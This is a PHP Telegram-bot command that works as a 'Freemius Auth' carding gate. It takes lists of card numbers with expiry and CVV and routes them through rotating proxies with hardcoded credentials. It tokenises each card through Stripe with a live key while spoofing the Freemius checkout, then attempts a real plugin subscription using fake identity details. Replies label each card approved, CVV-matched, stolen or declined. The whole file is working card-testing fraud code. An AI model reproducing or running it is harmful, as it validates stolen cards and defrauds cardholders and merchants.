<?php

//////////=========[FREEMIUS AUTH (2req) Command]=========//////////

if ((strpos($message, "/fr") === 0) || (strpos($message, ".fr") === 0)){
$lista = substr($message, 4);
$i     = explode("|", $lista);
$cc    = $i[0];
$mon    = $i[1];
$year  = $i[2];
$cvv   = $i[3];
error_reporting(0);
date_default_timezone_set('Asia/Jakarta');
if ($_SERVER['REQUEST_METHOD'] == "POST"){
extract($_POST);
}
elseif ($_SERVER['REQUEST_METHOD'] == "GET"){
extract($_GET);
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

//==================[BIN LOOK-UP]======================//

$ch = curl_init();
$bin = substr($cc, 0,6);
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$bin.'');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
$bindata = curl_exec($ch);
$binna = json_decode($bindata,true);
$scheme = $binna['scheme'];
$type = $binna['type'];
$brand = $binna['brand'];
$country = $binna['country']['name'];
$emoji = $binna['country']['emoji'];
$code = $binna['country']['alpha2'];
$bank = $binna['bank']['name'];
if(strpos($fim, '"type":"credit"') !== false) {$bin = 'Credit';}
else{$bin = 'Debit';};
curl_close($ch);

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];

//=======================[Proxys]=============================//
$Websharegay = rand(0,250);
$rp1 = array(
    1 => 'gsaqyxfp-US-rotate:r8vt7l84i50u',
    2 => 'irtgefsr-US-rotate:s6pgtddbhfxc',
    ); 
    $rotate = $rp1[array_rand($rp1)];
//////////////////////////==============[Proxy Section]===============//////////////////////////////
$ch = curl_init('https://api.ipify.org/');
curl_setopt_array($ch, [
CURLOPT_RETURNTRANSFER => true,
CURLOPT_PROXY => 'http://p.webshare.io:80',
CURLOPT_PROXYUSERPWD => $rotate,
CURLOPT_HTTPGET => true,
]);
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();  
if (isset($ip1)){
$ip = "Live! ✅";
}
if (empty($ip1)){
$ip = "Dead! ❌";
}

//=======================[1 REQ]==================================//

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/tokens',
'scheme: https',
'accept: application/json',
'accept-language: en-US',
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.freemius.com',
'referer: https://checkout.freemius.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: cross-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
   ));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[address_zip]='.$postcode.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&time_on_page=41400&pasted_fields=number&guid=NA&muid=NA&sid=NA&key=pk_live_eP8c8rXxkvgPXGLfBw2wjX4p&payment_user_agent=stripe.js%2F7315d41');

 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 curl_close($ch);


//=======================[2 REQ]==================================//
$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://checkout.freemius.com/action/service/subscribe/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: checkout.freemius.com',
'method: POST',
'path: /action/service/subscribe/',
'scheme: https',
'accept: application/json, text/javascript',
'accept-language: en-GB,en-US;q=0.9,en;q=0.8',
'content-type: application/json; charset=UTF-8',
'cookie: __fs_session=mi3adiub62haa9acjrgfb6caf2',
'origin: https://checkout.freemius.com',
'referer: https://checkout.freemius.com/?mode=dialog&guid=0d8fef25-dec5-f465-70aa-524e9b551949&plugin_id=4728&plan_id=7601&public_key=pk_89934c199e211bbc3aa24e2396ef9&image=https%3A%2F%2Fwebba-booking.com%2Fwp-content%2Fuploads%2F2020%2F01%2Flogo-webba-booking-256-256.png&name=Webba+Booking&licenses=1&billing_cycle=annual',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36',
   ));
curl_setopt($ch, CURLOPT_POSTFIELDS,'{"user_firstname":"'.$name.'","user_lastname":"'.$last.'","user_email":"'.last.'21@gmail.com","update_license":false,"cart_id":"355606","mode":"dialog","plugin_id":"4728","plugin_public_key":"pk_89934c199e211bbc3aa24e2396ef9","pricing_id":"7322","billing_cycle":"monthly","payment_method":"cc","country_code":"US","auto_install":false,"is_marketing_allowed":true,"is_affiliation_enabled":true,"is_sandbox":false,"failed_zipcode_purchases_count":0,"payment_token":"'.$id.'","prev_url":"https://checkout.freemius.com/?mode=dialog&guid=0d8fef25-dec5-f465-70aa-524e9b551949&plugin_id=4728&plan_id=7601&public_key=pk_89934c199e211bbc3aa24e2396ef9&image=https%3A%2F%2Fwebba-booking.com%2Fwp-content%2Fuploads%2F2020%2F01%2Flogo-webba-booking-256-256.png&name=Webba+Booking&licenses=1&billing_cycle=annual#!#https:%2F%2Fwebba-booking.com%2Fpricing%2F"}');
$result2 = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$time = substr($time, 0, 4);
curl_close($ch);



//==================[Responses]======================//

if ((strpos($result2, 'incorrect_zip')) || (strpos($result2, "The credit card's zip code validation failed.")) || (strpos($result2, 'The zip code you supplied failed validation.'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>APPROVED!</b> ✅%0A[Result] -> [<b>CVV-M</b>] [<b>AVS-N</b>]%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif ((strpos($result2, '"success":true'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>3D REDIRECT</b> ❌%0A[Result] -> <b>Please Try On Other Gate.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif ((strpos($result2, 'Your card has insufficient funds.')) || (strpos($result2, 'insufficient_funds'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>APPROVED!</b> ✅%0A[Result] -> <b>INSUFFICIENT FUNDS.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}


elseif ((strpos($result2, "The card's security code is incorrect.")) || (strpos($result2, "card_cvc")) || (strpos($result2, "The card's security code is incorrect."))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>APPROVED!</b> ✅%0A[Result] -> [<b>CCN-M</b>]%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif ((strpos($result2, "pickup_card")) || (strpos($result2, "stolen_card"))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>DECLINED!</b> ❌%0A[Result] -> <b>PICKUP/STOLEN.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif ((strpos($result2, "Your card does not support this type of purchase.")) || (strpos($result2, "transaction_not_allowed"))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>DECLINED!</b> ❌%0A[Result] -> <b>Not Support Purchase.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif (strpos($result2, "lost_card")){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>DECLINED!</b> ❌%0A[Result] -> <b>LOST CARD.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}


elseif (strpos($result2, "do_not_honor")){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>DECLINED!</b> ❌%0A[Result] -> <b>Generic Declin.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif ((strpos($result2, "generic_decline")) || (strpos($result2, "Decline code: 'generic_decline'"))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>DECLINED!</b> ❌%0A[Result] -> <b>Generic Decline.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}



elseif ((strpos($result2, 'The card number is incorrect.')) || (strpos($result2, 'Your card number is incorrect.')) || (strpos($result2, 'incorrect_number'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>DECLINED!</b> ❌%0A[Result] -> <b>Incorrect Card.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}


elseif ((strpos($result2, 'The card has expired.')) || (strpos($result2, 'expired_card'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>DECLINED!</b> ❌%0A[Result] -> <b>Expired Card.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}


elseif ((strpos($result2, "card_declined")) || (strpos($result2, 'Your card was declined.'))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>DECLINED!</b> ❌%0A[Result] -> <b>Card Declined.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif (strpos($result2, "An error occurred while processing the card.")){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>ERROR!</b> ❌%0A[Result] -> <b>An error occurred while processing the card. Please try again in few minutes.</b>%0A<i>——————————»«——————————%0A</i>[Bin Info] -> <b>'.$type.'-'.$brand.'</b> -> <b>'.$code.'('.$emoji.')%0A</b>[Bank] -> <b>'.$bank.'%0A</b><i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif (strpos($result2, "Invalid payment token.")){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>Error!</b> ❌%0A[Result] -> <b>Incorrect No. or Incorrect Format.</b>%0A<i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif ((strpos($result2, '"field":"email"')) || (strpos($result2, "Your email address either has a typo or it was flagged for security reasons."))){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>Error!</b> ❌%0A[Result] -> <b>Your Email is Invalid or Flaaged.!</b>%0A<i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif (strpos($result2, '-1')){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>Error!</b> ❌%0A[Result] -> <b>(-1)[Report this to owner.!]</b>%0A<i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

elseif ((strpos($result2, "missing input"))){
sendMessage($chatId, '❌Invalid Command❌%0A❗️GATE STRIPE AUTH%0A❗️Example: /fr xxxxxxxxxxxxxxxx|xx|xx|xxx%0A❗️EX :- /fr 4010990064374103|09|2026|345', $message_id);
}

elseif(!$result2){
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>Error!</b> ❌[try Again, or Report to owner.!]%0A[Result] -> <i><b>'.$result2.'</b></i>%0A<i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

else{
sendMessage($chatId, '𝐆𝐀𝐓𝐄<b> -> </b>𝐅𝐑𝐄𝐄𝐌𝐈𝐔𝐒 𝐀𝐔𝐓𝐇 <b>♻️</b>%0A%0A[Card] -> <i><code>'.$lista.'</code>%0A</i>[Status] -> <b>Error!</b> ❌[try Again, or Report to owner.!]%0A[Result] -> <i><b>'.$result2.'</b></i>%0A<i>——————————»«——————————%0A%0A</i><b>Proxy: </b><i>'.$ip.'%0A</i><b>Time Taken: </b><i>'.$time.'s%0A</i><b>Checked By: </b><i>@'.$username.'%0A</i><b>▬▬▬▬▬▬▬▬▬▬▬▬▬▬</b>%0A<b>Bot Made by:</b><a> [INSANE]</a>', $message_id);
}

curl_close($ch);

unlink("cookies.txt");
}

//=======================[Freemius Auth End]========================//

?>